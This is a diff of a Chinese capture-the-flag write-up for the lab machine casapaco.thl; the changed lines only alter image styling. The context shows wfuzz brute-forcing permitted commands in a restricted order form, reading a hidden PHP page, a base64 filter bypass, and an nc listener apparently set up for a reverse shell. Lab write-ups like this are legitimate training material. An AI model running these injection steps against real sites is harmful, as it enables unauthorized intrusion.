@@ -673,9 +673,9 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.81 se
 </pre></div>
 <p>先看<strong>80端口</strong>，<strong>22端口</strong>候补</p>
 <h1>2.踩点</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370"><img src="https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370"><img src="https://github.com/user-attachments/assets/dc05800a-1c1f-4dc3-8f59-5866ab2d2370" alt="image" style="max-width: 100%;"></a></p>
 <p>把域名加入<code class="notranslate">hosts</code></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c"><img src="https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c"><img src="https://github.com/user-attachments/assets/4470ec18-041e-40c9-9b97-c5a3c0536d5c" alt="image" style="max-width: 100%;"></a></p>
 <p>是个点餐的网站，你按照它的提示一直点到下单页，你发现<code class="notranslate">Plato</code>可以<strong>执行命令</strong>，但是有<strong>限制</strong>，连<code class="notranslate">ls</code>都无法执行,并且<strong>无法绕过</strong>，爆破一下可执行命令</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ wfuzz -c -u <span class="pl-s"><span class="pl-pds">"</span>http://casapaco.thl/llevar.php<span class="pl-pds">"</span></span> -w /usr/share/seclists/Fuzzing/1-4_all_letters_a-z.txt --hc 404 -d <span class="pl-s"><span class="pl-pds">"</span>name=a&amp;dish=FUZZ<span class="pl-pds">"</span></span> --hw 89,75
@@ -705,9 +705,9 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.81 se
 <span class="pl-s">000002956:   200        31 L     95 W       1215 Ch     "dir"  </span>
 <span class="pl-s">（省略）</span></pre></div>
 <p>发现可以执行<code class="notranslate">dir</code></p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a"><img src="https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a"><img src="https://github.com/user-attachments/assets/bd300755-3984-4cff-aac8-c71f3c82033a" alt="image" style="max-width: 100%;"></a></p>
 <p>当你<code class="notranslate">dir</code>，你就会发现有一个叫<code class="notranslate">llevar1.php</code>的页面（爆破不出来，只可以这样看），你可以使用<code class="notranslate">od</code>工具查看他文本</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68"><img src="https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68"><img src="https://github.com/user-attachments/assets/415d48a5-ba24-4df3-a6f3-893788a9ea68" alt="image" style="max-width: 100%;"></a></p>
 <p>我直接放<strong>可读版本</strong>了，想看原版的，自己执行一下</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
 <span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>es<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
@@ -819,7 +819,7 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.81 se
 <span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
 </pre></div>
 <p>那就简单了我们锁死<code class="notranslate">llevar1.php</code>提交命令就好了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06"><img src="https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06"><img src="https://github.com/user-attachments/assets/fb94c611-0f65-4b33-922d-a52e4292dd06" alt="image" style="max-width: 100%;"></a></p>
 <p>要进行<strong>base64绕过</strong>，不然执行不了</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888                                  
